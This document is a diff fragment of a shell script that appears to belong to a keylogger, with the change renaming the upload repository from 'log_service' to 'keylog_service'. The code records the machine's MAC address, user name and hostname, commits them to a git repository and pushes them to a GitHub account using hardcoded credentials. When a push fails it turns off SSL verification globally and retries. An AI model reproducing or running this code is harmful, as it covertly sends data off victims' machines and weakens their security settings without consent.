@@ -121,7 +121,7 @@ else
      ret=$?
      if [ $ret -ne 0 ]; then
           git init
-          git remote add origin https://github.com/reportlog/log_service.git
+          git remote add origin https://github.com/reportlog/keylog_service.git
           git checkout -b root-$(date '+%y_%m_%d_%I_%M_%S')
      	  read MAC </sys/class/net/eth0/address
           echo "started logx $MAC : $USER : $HOSTNAME $(date +"%D %T")" >  logx_$(date '+%y_%m_%d_%I_%M_%S').ljp
@@ -131,11 +131,11 @@ else
           git config --local --add user.email "root@rootmail.com"
           git config --local --add user.name "root"
           git commit -m "root-$(date +"%D %T")"
-          git push https://reportlog:1q2w3e4r5t@github.com/reportlog/log_service.git --all
+          git push https://reportlog:1q2w3e4r5t@github.com/reportlog/keylog_service.git --all
           ret=$?
      	  if [ $ret -ne 0 ]; then
                git config --global http.sslVerify false
-               git push https://reportlog:1q2w3e4r5t@github.com/reportlog/log_service.git --all
+               git push https://reportlog:1q2w3e4r5t@github.com/reportlog/keylog_service.git --all
           else
                echo "fetched successfully!!!"
           fi
